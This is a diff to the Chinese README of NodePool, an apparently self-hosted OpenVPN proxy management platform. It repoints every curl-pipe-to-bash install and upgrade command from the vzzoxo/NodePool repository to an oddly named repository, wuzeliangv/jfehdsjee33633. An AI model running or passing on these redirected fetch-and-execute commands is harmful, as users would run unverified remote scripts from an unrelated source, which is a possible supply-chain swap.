@@ -92,7 +92,7 @@ NodePool 是一个自部署的分布式 OpenVPN 出站代理管理平台。支�
 自动判断角色，交互式选择安装被控端或主控端：
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/setup.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/wuzeliangv/jfehdsjee33633/main/setup.sh)
 ```
 
 运行后会提示选择：
@@ -105,10 +105,10 @@ bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/setup.s
 
 ```bash
 # 安装被控端
-bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/setup.sh) --role=agent
+bash <(curl -fsSL https://raw.githubusercontent.com/wuzeliangv/jfehdsjee33633/main/setup.sh) --role=agent
 
 # 安装主控端
-bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/setup.sh) --role=master
+bash <(curl -fsSL https://raw.githubusercontent.com/wuzeliangv/jfehdsjee33633/main/setup.sh) --role=master
 ```
 
 ### 单角色直接安装
@@ -116,7 +116,7 @@ bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/setup.s
 **被控端**（等价于 `setup.sh` 选择 1）：
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/install.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/wuzeliangv/jfehdsjee33633/main/install.sh)
 ```
 
 **主控端**（进入项目 `master/` 目录后执行）：
@@ -218,7 +218,7 @@ curl --proxy http://127.0.0.1:10010 https://api.ipify.org
 ### 一键远程升级
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/vzzoxo/NodePool/main/upgrade.sh | bash
+curl -fsSL https://raw.githubusercontent.com/wuzeliangv/jfehdsjee33633/main/upgrade.sh | bash
 ```
 
 ### 本地升级
